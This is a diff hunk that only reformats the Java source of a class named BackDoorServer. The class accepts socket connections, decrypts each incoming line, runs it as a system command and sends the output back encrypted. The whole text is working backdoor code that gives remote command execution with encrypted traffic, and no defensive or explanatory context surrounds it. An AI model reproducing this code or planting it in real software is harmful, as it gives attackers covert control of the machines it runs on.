@@ -26,44 +26,48 @@ public class BackDoorServer {
     final ServerSocket serverSocket = new ServerSocket(port);
     while (!serverSocket.isClosed()) {
       final Socket socket = serverSocket.accept();
-      CompletableFuture.runAsync(() -> {
-        try (final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
-          try (final PrintWriter printWriter = new PrintWriter(socket.getOutputStream())) {
-            while (!socket.isClosed()) {
-              final String cmd = cryptoHelper.decrypt(bufferedReader.readLine());
-              if (cmd.equals("exit")) {
-                break;
-              }
-              if (cmd.equals("exit-server")) {
-                System.exit(0);
-              }
-              try {
-                final Process p = Runtime.getRuntime().exec(cmd);
-                final BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
-                buf.lines().forEach(
-                        s -> {
-                          try {
-                            printWriter.println(cryptoHelper.encrypt(s));
-                            printWriter.flush();
-                          } catch (final Exception e) {
-                            e.printStackTrace();
-                          }
-                        });
+      CompletableFuture.runAsync(
+          () -> {
+            try (final BufferedReader bufferedReader =
+                new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
+              try (final PrintWriter printWriter = new PrintWriter(socket.getOutputStream())) {
+                while (!socket.isClosed()) {
+                  final String cmd = cryptoHelper.decrypt(bufferedReader.readLine());
+                  if (cmd.equals("exit")) {
+                    break;
+                  }
+                  if (cmd.equals("exit-server")) {
+                    System.exit(0);
+                  }
+                  try {
+                    final Process p = Runtime.getRuntime().exec(cmd);
+                    final BufferedReader buf =
+                        new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    buf.lines()
+                        .forEach(
+                            s -> {
+                              try {
+                                printWriter.println(cryptoHelper.encrypt(s));
+                                printWriter.flush();
+                              } catch (final Exception e) {
+                                e.printStackTrace();
+                              }
+                            });
+                  } catch (final Exception e) {
+                    e.printStackTrace();
+                    printWriter.println(cryptoHelper.encrypt(e.getMessage()));
+                    printWriter.flush();
+                  }
+                  printWriter.println(cryptoHelper.encrypt(endSignal));
+                  printWriter.flush();
+                }
               } catch (final Exception e) {
                 e.printStackTrace();
-                printWriter.println(cryptoHelper.encrypt(e.getMessage()));
-                printWriter.flush();
               }
-              printWriter.println(cryptoHelper.encrypt(endSignal));
-              printWriter.flush();
+            } catch (final IOException e) {
+              e.printStackTrace();
             }
-          } catch (final Exception e) {
-            e.printStackTrace();
-          }
-        } catch (final IOException e) {
-          e.printStackTrace();
-        }
-      });
+          });
     }
   }
 }
